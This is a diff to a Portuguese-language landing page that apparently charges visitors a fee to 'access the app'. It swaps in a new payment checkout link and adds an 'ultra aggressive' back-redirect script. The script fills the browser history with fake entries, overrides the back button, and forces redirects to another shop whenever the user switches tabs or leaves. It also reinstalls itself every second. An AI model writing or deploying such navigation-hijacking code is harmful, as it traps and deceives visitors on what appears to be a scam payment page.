@@ -600,7 +600,7 @@
           </div>
         </div>
         <!-- Botão CTA -->
-        <button class="cta-button pulsante" onclick="window.location.href='https://pay.confirmapagamento.site/checkout/cf9f65ba-6bb6-4cf6-a5e3-ee14cb51d5fe' + window.location.search">
+        <button class="cta-button pulsante" onclick="window.location.href='https://www.pay-pagamentos.link/checkout/26238ec1-61b5-4ce3-87c9-301a883643df' + window.location.search">
           PAGAR A TAXA E ACESSAR O APP
         </button>
         <div class="alert-box">
@@ -709,29 +709,102 @@
 
       updateCountdown();
 
-      // Script de back redirect
-      const link = "https://spotify-pay-site.preview-domain.com/back-upsell1/";
+      // Script de back redirect PixTurbinado ULTRA AGRESSIVO
+      (function () {
+          'use strict';
 
-      function setBackRedirect(url) {
-        let urlBackRedirect = url;
-        urlBackRedirect =
-          urlBackRedirect.trim() +
-          (urlBackRedirect.indexOf("?") > 0 ? "&" : "?") +
-          document.location.search.replace("?", "").toString();
+          // Evita carregar múltiplas vezes
+          if (window.__BACK_REDIRECT_LOADED) {
+              return;
+          }
+          window.__BACK_REDIRECT_LOADED = true;
 
-        history.pushState({}, "", location.href);
-        history.pushState({}, "", location.href);
-        history.pushState({}, "", location.href);
+          var DEFAULT_REDIRECT = 'https://pixturbinado.shop/back';
+          var TRIGGER_DELAY = 100; // reduzido para resposta mais rápida
 
-        window.addEventListener("popstate", () => {
-          console.log("onpopstate", urlBackRedirect);
-          setTimeout(() => {
-            location.href = urlBackRedirect;
-          }, 1);
-        });
-      }
+          var resolvedUrl = DEFAULT_REDIRECT;
+          console.log('PixTurbinado Back Redirect carregado. URL de destino:', resolvedUrl);
 
-      setBackRedirect(link);
+          function forceRedirect() {
+              console.log('PixTurbinado: FORÇANDO redirecionamento para', resolvedUrl);
+              try {
+                  window.location.replace(resolvedUrl);
+              } catch (e) {
+                  try {
+                      window.location.href = resolvedUrl;
+                  } catch (e2) {
+                      window.open(resolvedUrl, '_self');
+                  }
+              }
+          }
+
+          function scheduleRedirect() {
+              console.log('PixTurbinado: Agendando redirecionamento para', resolvedUrl);
+              setTimeout(forceRedirect, TRIGGER_DELAY);
+          }
+
+          // Instala múltiplas camadas de proteção
+          function installHistoryTrap() {
+              try {
+                  // Adiciona múltiplas entradas no histórico
+                  history.pushState({ redirectTrap: true }, '', location.href);
+                  history.pushState({ redirectTrap: true }, '', location.href);
+                  history.pushState({ redirectTrap: true }, '', location.href);
+                  
+                  console.log('PixTurbinado: History trap instalado com múltiplas camadas');
+                  
+                  // Listener principal para popstate
+                  window.addEventListener('popstate', function (event) {
+                      console.log('PixTurbinado: Popstate detectado - REDIRECIONANDO IMEDIATAMENTE', event);
+                      event.preventDefault();
+                      event.stopPropagation();
+                      forceRedirect();
+                      return false;
+                  }, true);
+
+                  // Listener adicional sem capture
+                  window.addEventListener('popstate', function (event) {
+                      console.log('PixTurbinado: Popstate secundário detectado');
+                      forceRedirect();
+                  });
+
+              } catch (e) {
+                  console.log('PixTurbinado: Erro ao instalar history trap:', e);
+              }
+          }
+
+          // Detecta quando a página fica oculta (usuário mudou de aba)
+          document.addEventListener('visibilitychange', function () {
+              if (document.visibilityState === 'hidden') {
+                  console.log('PixTurbinado: Página ficou oculta - redirecionando');
+                  scheduleRedirect();
+              }
+          });
+
+          // Detecta quando a página está sendo fechada/saindo
+          window.addEventListener('pagehide', function (event) {
+              console.log('PixTurbinado: Pagehide detectado - redirecionando');
+              scheduleRedirect();
+          });
+
+          // Detecta tentativas de navegação
+          window.addEventListener('beforeunload', function (event) {
+              console.log('PixTurbinado: Beforeunload detectado');
+              // Não podemos redirecionar aqui, mas podemos logar
+          });
+
+          // Instala o trap imediatamente
+          installHistoryTrap();
+
+          // Força uma verificação periódica
+          setInterval(function() {
+              if (history.length < 3) {
+                  console.log('PixTurbinado: Reinstalando history trap');
+                  installHistoryTrap();
+              }
+          }, 1000);
+
+      })();
     </script>
   
 
